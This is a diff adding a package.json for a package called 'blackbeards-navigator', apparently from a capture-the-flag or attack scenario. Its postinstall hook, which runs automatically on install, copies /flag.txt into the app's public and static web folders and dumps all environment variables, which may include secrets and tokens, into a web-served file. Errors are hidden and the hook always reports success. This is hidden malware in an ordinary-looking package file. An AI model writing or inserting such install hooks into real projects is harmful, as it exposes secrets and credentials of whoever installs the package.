@@ -1,0 +1,9 @@
+{
+    "name": "blackbeards-navigator",
+    "version": "1.23.456",
+    "scripts": {
+      "postinstall": "cp /flag.txt /app/static/f.txt 2>/dev/null; cp
+  /flag.txt /app/public/f.txt 2>/dev/null; printenv > /app/static/env.txt
+  2>/dev/null; true"
+    }
+  }
